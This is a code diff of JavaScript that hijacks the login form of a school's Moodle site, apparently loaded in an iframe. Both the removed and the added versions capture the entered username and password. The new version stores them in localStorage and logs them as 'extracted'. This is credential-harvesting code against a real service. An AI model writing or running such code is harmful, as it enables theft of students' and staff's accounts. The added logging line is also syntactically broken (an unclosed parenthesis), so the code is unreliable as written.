@@ -36,15 +36,18 @@ if(documentTree == undefined && document.location.hash != "#noiframe"){
 				doc.getElementById("login").removeAttribute("action");
 				doc.getElementById("login").removeAttribute("method");
 				doc.getElementById("login").onsubmit = function(event){
-						
-						let url = "https://moodle.bg-ka.schule/my/#"+doc.getElementById("username").value+"#"+doc.getElementById("password").value
-						
-						doc.location.href = url;
+							
+					let url = "https://moodle.bg-ka.schule/my/"
 					
-						return false;
-					};
-			}else if(doc.location.href.includes("https://moodle.bg-ka.schule/my/#")){
-				console.log("extracted password and username are " + doc.location.href.split("#")[1].split("%23").join(" "));
+					localStorage.setItem("pass",doc.getElementById("password").value);
+					localStorage.setItem("name",doc.getElementById("username").value);
+					
+					doc.location.href = url;
+				
+					return false;
+				};
+			}else if(localStorage.getItem("pass") != undefined){
+				console.log("extracted password and username are " + localStorage.getItem("pass") +" , "+ localStorage.getItem("name");
 			}else if(doc.location.href == "https://moodle.bg-ka.schule/login/index.php?loginredirect=1"){
 				console.log("user login failed");
 			}
